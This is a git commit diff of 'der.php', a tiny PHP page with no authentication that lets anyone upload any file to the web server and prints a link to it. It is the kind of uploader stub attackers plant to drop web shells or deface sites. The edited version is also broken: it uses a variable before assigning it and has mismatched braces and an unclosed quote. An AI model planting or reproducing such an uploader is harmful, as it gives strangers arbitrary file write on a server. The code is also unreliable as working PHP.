80d73a467906326587ab1450e42d8cdab4543dc0
bintangAlif5 <49284528+bintangAlif5@users.noreply.github.com>
2019-08-02 09:58:07 +0700

    Update der.php

--- der.php
+++ der.php
@@ -5,23 +5,11 @@ echo "<form method='post' enctype='multipart/form-data'>
 	  <input type='file' name='idx_file'>
 	  <input type='submit' name='upload' value='upload'>
 	  </form>";
-$root = $_SERVER['DOCUMENT_ROOT'];
-$files = $_FILES['idx_file']['name'];
-$dest = $root.'/'.$files;
-if(isset($_POST['upload'])) {
-	if(is_writable($root)) {
-		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
-			$web = "http://".$_SERVER['HTTP_HOST']."/";
-			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
+    $files = $_FILES['idx_file']['name'];
+    $web = "http://".$_SERVER['HTTP_HOST']."/";
+    echo "Sukses Upload => <a href='".$web.$files."' target='_blank>".$web.$files."</a>";
 		} else {
-			echo "gagal upload di document root.";
+			echo "<script> alert('gagal upload >:(');</script>";
 		}
-	} else {
-		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
-			echo "sukses upload <b>$files</b> di folder ini";
-		} else {
-			echo "gagal upload";
-		}
-	}
-}
 ?>
